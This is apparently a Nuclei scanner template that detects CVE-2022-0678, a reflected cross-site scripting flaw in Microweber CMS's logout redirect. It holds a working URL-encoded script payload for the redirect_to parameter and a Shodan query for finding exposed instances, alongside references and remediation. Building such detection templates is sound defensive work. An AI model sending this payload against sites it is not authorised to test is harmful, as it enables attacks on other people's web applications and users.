http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '><script>alert(document.domain)</script>'
    - content="Microweber"
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2022-0678
info:
  author: tess,co5mos
  classification:
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-0678
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.49958
    epss-score: 0.00143
  description: 'Packagist prior to 1.2.11 contains a cross-site scripting vulnerability
    via microweber/microweber. User can escape the meta tag because the user doesn''t
    escape the double-quote in the $redirectUrl parameter when logging out.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 1
    product: microweber
    shodan-query: http.favicon.hash:780351152
    vendor: microweber
    verified: true
  name: Microweber <1.2.11 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0/
  - https://twitter.com/CVEnew/status/1495001503249178624?s=20&t=sfABvm7oG39Fd6rG44vQWg
  - https://huntr.dev/bounties/d707137a-aace-44c5-b15c-1807035716c0
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0678
  - https://github.com/microweber/microweber/commit/2b8fa5aac31e51e2aca83c7ef5d1281ba2e755f8
  remediation: 'Upgrade Microweber CMS to version 1.2.11 or later, which includes
    a fix for this vulnerability.

    '
  severity: medium
  tags: huntr,cve,cve2022,xss,microweber
